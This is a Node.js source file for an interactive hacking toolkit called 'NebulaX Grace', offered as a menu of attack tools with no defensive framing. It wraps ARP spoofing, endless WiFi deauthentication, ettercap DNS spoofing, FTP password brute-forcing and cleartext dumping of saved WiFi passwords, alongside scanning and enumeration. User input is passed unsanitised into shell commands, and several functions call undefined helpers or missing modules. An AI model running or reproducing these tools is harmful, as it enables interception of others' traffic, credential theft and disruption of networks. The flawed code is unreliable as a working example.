const os = require('os');
const { exec, execSync } = require('child_process');
const readline = require('readline');
const request = require('request');
const dns = require('dns');
const whois = require('whois');
const ping = require('ping');
const net = require('net');
const ip = require('ip');
const figlet = require('figlet');
const { spawn } = require('child_process');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function waitFor(seconds) {
    return new Promise((resolve) => {
        setTimeout(resolve, seconds * 1000);
    });
}

class NebulaXGrace {
    constructor() {
        this.currentDirectory = process.cwd();
        this.tools = {
            "sniff": this.runSniff,
            "arp_spoof": this.runArpSpoof,
            "wifi_scan": this.runWifiScan,
            "mac_change": this.runMacChange,
            "port_scan": this.runPortScan,
            "banner_grab": this.runBannerGrab,
            "dns_enum": this.runDnsEnum,
            "ping_sweep": this.runPingSweep,
            "traceroute": this.runTraceroute,
            "whois_lookup": this.runWhoisLookup,
            "ftp_bruteforce": this.runFtpBruteforce,
            "smb_enum": this.runSmbEnum,
            "rdp_check": this.runRdpCheck,
            "wifi_password_view": this.runWifiPasswordView,
            "get_ip": this.getIp,
            "get_wifi_password": this.getWifiPassword,
            "network_mapper": this.networkMapper,
            "packet_injector": this.packetInjector,
            "wifi_deauth": this.wifiDeauth,
            "dns_spoofer": this.dnsSpoofer,
            "phone_lookup": this.phoneLookup,
            "url_redirector": this.urlRedirector,
            "get_ip_near_ip": this.getIpNearIp
        };
    }

    displayLogo() {
        figlet('NebulaX GraceX', (err, data) => {
            if (err) {
                console.log('Something went wrong with the ASCII art...');
                console.dir(err);
                return;
            }
            console.log(data);
        });
    }

    run() {
        const askQuestion = () => {
            process.stdout.write(" ");
            rl.question("┌──(NebulaX Grace)-[~] \n└─$ ", (command) => {
                if (command === "exit") {
                    rl.close();
                } else if (command === "clear") {
                    console.clear();
                    askQuestion();
                } else if (command === "help") {
                    this.showHelp();
                    askQuestion();

                } else if (this.tools[command]) {
                    try {
                        this.tools[command].bind(this)();
                    } catch (e) {
                        console.log("Error:", e);
                    }
                    askQuestion();
                } else {
                    console.log("Command not recognized:", command);
                    askQuestion();
                }
            });
        };

        askQuestion();
    }


    showHelp() {
        console.log("Available commands:");
        for (const tool in this.tools) {
            console.log(`- ${tool}`);
        }
        console.log("- help: Show this help message");
        console.log("- exit: Exit NebulaX Grace");
    }

    runSniff() {
        console.log("Running packet sniffer...");
        const host = readline.question("Enter IP address to sniff on: ");
        const packetCount = parseInt(readline.question("Enter number of packets to capture: "), 10);

        const sniffer = exec(`tcpdump -i ${host} -c ${packetCount}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    runArpSpoof() {
        console.log("Running ARP spoofing attack...");
        const target = input("Enter target IP: ");
        const gateway = input("Enter gateway IP: ");
        const netInterface = input("Enter network interface: ");

        exec(`arpspoof -i ${netInterface} -t ${target} ${gateway}`, (err, stdout, stderr) => {
            if (err) {
                console.log(`Error: ${stderr}`);
            } else {
                console.log(`ARP spoofing output: ${stdout}`);
            }
        });
    }

    runWifiScan() {
        console.log("Scanning for WiFi networks...");
        exec("netsh wlan show networks mode=bssid", (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    runMacChange() {
        console.log("Changing MAC address...");
        const netInterface = readline.question("Enter network interface: ");
        const newMac = readline.question("Enter new MAC address: ");
        exec(`ifconfig ${netInterface} hw ether ${newMac}`);
        console.log(`Changed MAC address of ${netInterface} to ${newMac}`);
    }

    runPortScan() {
        const target = readline.question("Enter target IP: ");
        const startPort = parseInt(readline.question("Enter start port: "), 10);
        const endPort = parseInt(readline.question("Enter end port: "), 10);

        for (let port = startPort; port <= endPort; port++) {
            const client = new net.Socket();
            client.connect(port, target, () => {
                console.log(`Port ${port}: Open`);
                client.destroy();
            });
            client.on('error', () => client.destroy());
        }
    }

    runBannerGrab() {
        const target = readline.question("Enter target IP: ");
        const port = parseInt(readline.question("Enter port: "), 10);

        const client = new net.Socket();
        client.connect(port, target, () => {
            client.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
        });

        client.on('data', (data) => {
            console.log(`Banner: ${data}`);
            client.destroy();
        });

        client.on('error', (err) => {
            console.error(`Error: ${err.message}`);
            client.destroy();
        });
    }

    runDnsEnum() {
        const domain = readline.question("Enter domain to enumerate: ");
        const recordTypes = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'SOA', 'TXT'];

        recordTypes.forEach((recordType) => {
            dns.resolve(domain, recordType, (err, records) => {
                if (!err) {
                    console.log(`${recordType} : ${records}`);
                }
            });
        });
    }

    runPingSweep() {
        const network = readline.question("Enter network address (e.g., 192.168.1.0): ");
        const hostIps = [];

        for (let i = 1; i <= 254; i++) {
            const hostIp = `${network.slice(0, -1)}${i}`;
            ping.sys.probe(hostIp, (isAlive) => {
                if (isAlive) {
                    console.log(`Host ${hostIp} is up`);
                }
            });
        }
    }

    runTraceroute() {
        const target = readline.question("Enter target IP or hostname: ");
        exec(`traceroute ${target}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    runWhoisLookup() {
        const domain = readline.question("Enter domain name: ");
        whois.lookup(domain, (err, data) => {
            if (err) {
                console.error(`Error: ${err.message}`);
            } else {
                console.log(data);
            }
        });
    }

    runFtpBruteforce() {
        const target = readline.question("Enter FTP server IP: ");
        const username = readline.question("Enter username: ");
        const wordlistPath = readline.question("Enter path to password wordlist: ");
        const passwords = fs.readFileSync(wordlistPath, 'utf8').split('\n');

        passwords.forEach((password) => {
            const ftp = require('ftp-client');
            const client = new ftp({ host: target, user: username, password: password.trim() }, { logging: 'basic' });

            client.connect(() => {
                client.list('.', (err) => {
                    if (!err) {
                        console.log(`Login successful: ${username}:${password}`);
                        client.close();
                    } else {
                        console.log(`Failed: ${password}`);
                    }
                });
            });
        });
    }

    runSmbEnum() {
        const target = readline.question("Enter target IP: ");
        exec(`smbclient -L \\\\${target} -U anonymous`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    runRdpCheck() {
        const target = readline.question("Enter target IP: ");
        exec(`nc -zv ${target} 3389`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    runWifiPasswordView() {
        exec('netsh wlan show profiles', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            const profiles = stdout.match(/All User Profile\s*: (.*)/g);
            if (profiles) {
                profiles.forEach(profile => {
                    const wifiName = profile.split(':')[1].trim();
                    exec(`netsh wlan show profile name="${wifiName}" key=clear`, (err, out, stdErr) => {
                        if (err) {
                            console.error(`Error: ${err.message}`);
                        }
                        if (stdErr) {
                            console.error(`Error: ${stdErr}`);
                        }
                        const key = out.match(/Key Content\s*: (.*)/);
                        if (key) {
                            console.log(`WiFi Name: ${wifiName}, Password: ${key[1]}`);
                        } else {
                            console.log(`WiFi Name: ${wifiName}, Password: Not found`);
                        }
                    });
                });
            }
        });
    }

    getIp() {
        console.log(`Your IP address is: ${ip.address()}`);
    }

    getWifiPassword() {
        exec('netsh wlan show profiles', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            const profiles = stdout.match(/All User Profile\s*: (.*)/g);
            if (profiles) {
                profiles.forEach(profile => {
                    const wifiName = profile.split(':')[1].trim();
                    exec(`netsh wlan show profile name="${wifiName}" key=clear`, (err, out, stdErr) => {
                        if (err) {
                            console.error(`Error: ${err.message}`);
                        }
                        if (stdErr) {
                            console.error(`Error: ${stdErr}`);
                        }
                        const key = out.match(/Key Content\s*: (.*)/);
                        if (key) {
                            console.log(`WiFi Name: ${wifiName}, Password: ${key[1]}`);
                        } else {
                            console.log(`WiFi Name: ${wifiName}, Password: Not found`);
                        }
                    });
                });
            }
        });
    }

    networkMapper() {
        const network = readline.question("Enter network (e.g., 192.168.1.0/24): ");
        exec(`nmap -sP ${network}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    packetInjector() {
        const target = readline.question("Enter target IP: ");
        const packetData = readline.question("Enter packet data to inject: ");
        exec(`hping3 -c 1 -d ${packetData.length} -E ${packetData} ${target}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    wifiDeauth() {
        const target = readline.question("Enter target MAC address: ");
        const iface = readline.question("Enter network interface: ");
        exec(`aireplay-ng --deauth 0 -a ${target} ${iface}`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    dnsSpoofer() {
        const iface = readline.question("Enter network interface: ");
        const spoofIp = readline.question("Enter IP address to spoof: ");
        exec(`ettercap -T -M arp:remote -i ${iface} -P dns_spoof /${spoofIp}/`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            if (stderr) {
                console.error(`Error: ${stderr}`);
            }
            console.log(stdout);
        });
    }

    phoneLookup() {
        const phoneNumber = readline.question("Enter phone number: ");
        request(`https://api.opencnam.com/v3/phone/${phoneNumber}`, (error, response, body) => {
            if (error) {
                console.error(`Error: ${error.message}`);
            }
            console.log(body);
        });
    }

    urlRedirector() {
        const url = readline.question("Enter URL to redirect: ");
        const redirectUrl = readline.question("Enter redirect URL: ");
        const server = http.createServer((req, res) => {
            res.writeHead(302, { 'Location': redirectUrl });
            res.end();
        });
        server.listen(80, () => console.log(`Redirecting ${url} to ${redirectUrl}`));
    }

    getIpNearIp() {
        const currentIp = ip.address();
        const parts = currentIp.split('.');
        for (let i = 1; i <= 254; i++) {
            parts[3] = i;
            const newIp = parts.join('.');
            ping.sys.probe(newIp, (isAlive) => {
                if (isAlive) {
                    console.log(`IP: ${newIp} is up`);
                }
            });
        }
    }
}

const nebulaXGrace = new NebulaXGrace();
nebulaXGrace.run();
